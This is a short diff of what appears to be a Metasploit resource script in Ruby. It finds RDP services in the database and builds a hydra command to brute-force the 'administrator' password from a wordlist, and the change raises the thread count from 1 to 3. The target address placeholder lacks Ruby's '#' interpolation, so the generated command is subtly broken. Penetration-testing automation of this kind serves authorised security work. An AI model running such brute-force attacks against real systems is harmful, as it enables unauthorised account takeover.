@@ -2,7 +2,7 @@
 framework.db.hosts.each do |host|
   host.services.each do |service|
     if service.name == "ms-wbt-server"
-      hydra_cmd = "hydra -t 1 -l administrator -P /usr/share/wordlists/metasploit/ipmi_passwords.txt -e nsr -s #{service.port} {host.address} rdp"
+      hydra_cmd = "hydra -t 3 -l administrator -P /usr/share/wordlists/metasploit/ipmi_passwords.txt -e nsr -s #{service.port} {host.address} rdp"
       print "\n\n"
       print_status "Running hydra on #{host.address}:#{service.port}"
       print_status "#{hydra_cmd}"
